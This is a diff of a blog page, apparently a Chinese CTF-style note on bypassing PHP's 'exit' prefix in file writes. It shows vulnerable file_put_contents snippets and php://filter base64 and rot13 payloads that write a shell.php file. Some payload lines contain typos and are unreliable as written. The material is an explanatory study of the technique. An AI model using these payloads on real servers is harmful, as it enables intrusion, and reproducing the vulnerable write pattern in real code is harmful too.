@@ -33,6 +33,7 @@
 
   
 
+<link rel="alternate" href="/atom.xml" title="Shmily-ing" type="application/atom+xml">
 </head>
 
 </html>
@@ -102,19 +103,19 @@
     <div class="article-entry" itemprop="articleBody">
        
   <hr>
-<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line">$filename = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$data  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. $filename;</span><br><span class="line">file_put_content($filename,$data);</span><br></pre></td></tr></table></figure>
 
 
 
 <p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
-<span id="more"></span>
+<a id="more"></a>
 
 <blockquote>
 <p>Payload:     </p>
 <p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
 <p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
 </blockquote>
-<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>
 
 
 
